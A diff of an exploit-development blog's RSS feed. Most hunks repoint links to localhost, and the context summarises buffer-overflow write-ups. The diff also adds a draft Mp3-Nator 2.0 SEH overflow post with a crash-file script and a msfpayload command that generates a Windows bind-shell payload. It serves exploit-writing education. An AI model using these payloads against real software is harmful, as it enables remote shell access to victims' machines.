@@ -2,19 +2,19 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Seh on camelinc</title>
-    <link>http://camelinc.info/tags/seh/</link>
+    <link>http://localhost:1313/tags/seh/</link>
     <description>Recent content in Seh on camelinc</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Mon, 26 May 2014 13:05:09 +0000</lastBuildDate>
-    <atom:link href="http://camelinc.info/tags/seh/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/tags/seh/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
       <title>Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</title>
-      <link>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</link>
+      <link>http://localhost:1313/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</link>
       <pubDate>Mon, 26 May 2014 13:05:09 +0000</pubDate>
       
-      <guid>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</guid>
+      <guid>http://localhost:1313/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</guid>
       <description>
 
 &lt;h1 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h1&gt;
@@ -44,8 +44,8 @@
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -67,8 +67,8 @@ At the time of the access violation the following register values are presented.
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -86,8 +86,8 @@ The output is depicted in the following screenshot.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Offset for EIP is 1109&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; alt=&#34;Offset for EIP is 1109&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Offset for EIP is 1109&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/findmsp.png&#34; alt=&#34;Offset for EIP is 1109&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -106,8 +106,8 @@ After updating the initial script, we can now exactly overwrite EIP.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Overwriting EIP with BBBB&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; alt=&#34;Overwriting EIP with BBBB&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/overwrite_eip.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Overwriting EIP with BBBB&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/overwrite_eip.png&#34; alt=&#34;Overwriting EIP with BBBB&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -127,8 +127,8 @@ So let&amp;rsquo;s identify a location that stores a suiteable JMP ESP.&lt;/p&gt
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;JMP ESP instructions available in process memory.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; alt=&#34;JMP ESP instructions available in process memory.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;JMP ESP instructions available in process memory.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/jmp_esp.png&#34; alt=&#34;JMP ESP instructions available in process memory.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -150,8 +150,8 @@ Let&amp;rsquo;s create a byte pattern and compare it against loaded data.&lt;/p&
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; alt=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/bad_chars.png&#34; alt=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -226,8 +226,8 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
 &lt;p&gt;
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/dvdxplayer/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/dvdxplayer/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -245,10 +245,10 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
     
     <item>
       <title>Easy RM to MP3 Converter</title>
-      <link>http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/</link>
+      <link>http://localhost:1313/blog/2014/05/Easy-RM-to-MP3-Converter/</link>
       <pubDate>Sun, 25 May 2014 11:27:27 +0000</pubDate>
       
-      <guid>http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/</guid>
+      <guid>http://localhost:1313/blog/2014/05/Easy-RM-to-MP3-Converter/</guid>
       <description>
 
 &lt;h1 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h1&gt;
@@ -281,8 +281,8 @@ Boom, the application crashes.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -302,8 +302,8 @@ The application crashes and we now have a unique pattern stored in EIP.&lt;/p&gt
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -318,8 +318,8 @@ The application crashes and we now have a unique pattern stored in EIP.&lt;/p&gt
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; alt=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; alt=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -332,8 +332,8 @@ This gives us power over EIP.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; alt=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; alt=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -351,8 +351,8 @@ Mona helps finding an appropriate address in memory.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; alt=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; alt=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -377,8 +377,8 @@ Subsequently, bad characters can be identified in a debugger.&lt;/p&gt;
 
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; alt=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; alt=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -458,8 +458,8 @@ The final step is to create the malicious m3u file and manually load it into the
 &lt;p&gt;
 
 &lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
+    &lt;a href=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
+        &lt;img src=&#34;http://localhost:1313/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
@@ -471,6 +471,53 @@ The final step is to create the malicious m3u file and manually load it into the
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/9186/&#34;&gt;EDB-ID: 9186&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/10374/&#34;&gt;EDB-ID: 10374&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://blog.pusheax.com/2013/03/exploit-writing-stack-based-buffer.html&#34;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)</title>
+      <link>http://localhost:1313/blog/2014/05/Mp3-Nator-2.0---Buffer-Overflow-Exploit-SEH/</link>
+      <pubDate>Sun, 25 May 2014 11:25:29 +0000</pubDate>
+      
+      <guid>http://localhost:1313/blog/2014/05/Mp3-Nator-2.0---Buffer-Overflow-Exploit-SEH/</guid>
+      <description>
+
+&lt;h2 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows XP SP3&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/8eb96fd0a43f4e2413fd52f51e7d329c-mp3nator.zip&#34;&gt;Mp3-Nator 2.0&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;triggering-the-overflow&#34;&gt;Triggering the overflow&lt;/h2&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6000&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;evil.plf&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id=&#34;identifying-eip-offset&#34;&gt;Identifying EIP Offset&lt;/h2&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfpayload windows/console_bind_tcp LPORT=9988 R | msfencode -b &amp;quot;\x00\x0A\x0D&amp;quot; -t c&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id=&#34;controlling-eip&#34;&gt;Controlling EIP&lt;/h2&gt;
+
+&lt;h2 id=&#34;the-exploit&#34;&gt;The Exploit&lt;/h2&gt;
+
+&lt;h2 id=&#34;links-and-references&#34;&gt;Links and References&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/15489/&#34;&gt;EDB-ID: 15489&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&#34;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
